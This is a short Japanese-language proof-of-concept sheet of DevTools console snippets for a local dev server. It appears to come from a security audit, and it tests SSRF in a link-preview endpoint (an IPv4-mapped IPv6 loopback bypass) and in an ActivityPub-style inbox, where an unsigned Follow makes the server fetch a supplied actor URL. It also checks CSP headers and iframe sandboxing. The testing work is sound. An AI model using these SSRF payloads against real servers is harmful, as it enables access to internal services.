# Console PoC (DevTools貼付け用・ローカル専用)

**本番に実行禁止。** 前提: `npm run dev:test` 起動し `http://localhost:8788` を開いた状態でDevTools Consoleに貼る。
Node完全版は `poc/README.md` 参照。Consoleは`listen()`不可のため、漏洩側サーバが必要な実証はNode併用。

## 1. link-preview阻止の対照 (Console完結)

```js
// 127.0.0.1リテラルは400で阻止されるはず(正常系の確認)
console.log(await (await fetch('/api/link-preview?url=' + encodeURIComponent('http://127.0.0.1:9/x'))).text());
// bypass実証はNode必須: 別端末で node poc/ssrf-link-preview.mjs
// VULN時: [::ffff:127.0.0.1] で {"title":"PWNED-INTERNAL",...} が返る
```

## 2. inbox actor-SSRF (Console=POST側、HIT確認は端末側)

```js
// まず別端末で evilサーバ相当を立てる(例: node poc/ssrf-inbox.mjs がHIT表示)。
// ConsoleからはPOSTだけ飛ばす:
console.log(await (await fetch('/api/inbox', { method: 'POST',
  headers: { 'content-type': 'application/activity+json' },
  body: JSON.stringify({ type: 'Follow', actor: 'http://127.0.0.1:1/evil-actor', object: location.origin + '/' })
})).text());
// VULN時: 署名なしでもサーバ側が actor URLへGETする(端末のHITログで確認)。Console単体ではHITは見えない
```

## 3. CSP / iframe live確認 (Console完結)

```js
// 応答ヘッダのCSP(環境により未付与の場合あり)
console.log('CSP:', await fetch('/').then(r => r.headers.get('content-security-policy')));
// ページ内iframeのsandbox属性
console.log([...document.querySelectorAll('iframe')].map(f => f.getAttribute('sandbox') ?? '(sandboxなし) — 要素:' + (f.className || f.id || f.src)));
// VULN時: 広告iframeが「(sandboxなし)」で現れる
// 静的確定版(サーバ不要): node poc/csp-ad-sandbox-check.mjs
```
